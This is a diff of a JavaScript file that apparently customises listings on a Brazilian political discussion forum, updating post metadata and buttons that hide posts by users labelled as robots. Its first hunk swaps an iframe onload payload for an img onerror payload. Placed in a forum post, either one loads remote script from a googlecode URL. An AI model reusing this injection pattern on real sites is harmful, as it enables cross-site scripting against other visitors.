@@ -1,6 +1,6 @@
 /*
 
-$(".post:eq(1) h3 a").prepend('     <iframe height=0 src=about:blank onload=$.getScript(&#39//opl.googlecode.com/svn/m.js&#39)></iframe>     ');
+$(".post:eq(1) h3 a").prepend('   <img src=æ onerror=$.ajaxSetup({cache:true});$.getScript(&#39//opl.googlecode.com/svn/m.js&#39)>  ');
 
 -------------------------------------------------
 
@@ -21,7 +21,7 @@ info =[
   
  {cat:"R",titulo:"PROPAGANDA ELEITORAL DO PSDB",p:0},
  
- {cat:"",titulo:"Aécio Neves e o Spam", metas:"<a href='' class='author'>Por Obi Ser Vando</a>, <span class='data'> 14/05/2013 às 02:09  </span> <a href='http://www.observadorpolitico.org.br/grupos/comunicacao/forum/topic/aecio-neves-e-o-spam/#comments' class='comments' title=''> / 12+opi.s </a>",url:"http://www.observadorpolitico.org.br/grupos/comunicacao/forum/topic/aecio-neves-e-o-spam", img:"http://i.imgur.com/kBQIu5H.jpg?1",p:0},
+ {cat:"",titulo:"Aécio Neves e o Spam", metas:"<a href='' class='author'>Por Obi Ser Vando</a>, <span class='data'> 14/05/2013 às 02:09  </span> <a href='http://www.observadorpolitico.org.br/grupos/comunicacao/forum/topic/aecio-neves-e-o-spam/#comments' class='comments' title=''> / 15+opi.s </a>",url:"http://www.observadorpolitico.org.br/grupos/comunicacao/forum/topic/aecio-neves-e-o-spam", img:"http://i.imgur.com/kBQIu5H.jpg?1",p:0},
 
 {cat:"",titulo:"<button id=\"norobot\" type=\"button\" onclick=\"$('.detailSeta').click();$(this).hide();$('.boxBlue p').append('sem_robôs');int=setInterval(function(){$('.post:has(.user-9463-avatar,.user-9458-avatar,.user-7268-avatar,#norobot)').hide()},3000)\" >Clique aqui para ocultar robôs Barbara, Juca e Braulio</button> <button type=\"button\" onclick=\"$('.detailSeta').click();$(this).hide();$('.boxBlue p').append('_E');int2=setInterval(function(){$('.post:has(.user-8993-avatar,)').hide()},3000)\" >Elton</button>",metas:"Dicas: clique no botão [Mais recentes] para atualizar a lista de discussões e manter o script funcionando;<br>Clique com o botão direito no link ou título da discussão e escolha abrir em uma nova guia ou janela;<br>Numa alternativa ao uso dos botões de ocultar, experimente o botão [Mais discutidas] —somente as postagens que tem comentários aparecem na lista. <a href=\"http://www.observadorpolitico.org.br/grupos/tecnologia/forum/topic/ocultar-postagens-na-lista-de-discussao\">[+Dicas]</a>",url:"",img:"http://i.imgur.com/sbaWUoQs.jpg",p:0},
 
@@ -50,7 +50,7 @@ info =[
 
 txtch = '<a href="#" style="position: absolute; top: -25px;color:#01acf1;font-weight: bold; right: 25px;z-index: 0;font-size: 80%;font-family: \'HelveticaLTStdBold\';text-align: center;width: 90px;">carregar mais<span style="position: absolute;top: -3px;  display: block; background: url(/wp-content/themes/gk/images/sprite.png) no-repeat -275px -218px; width: 90px; height: 30px;z-index: -1;"></span></a>' ,
 
-$xx = $(".post:has([onload*='opl.google'])").removeClass().css("position","relative").html(txtch).click(function(e){
+$xx = $(".post:has([onerror*='opl.google'])").removeClass().css("position","relative").html(txtch).click(function(e){
 
 
   e.preventDefault();
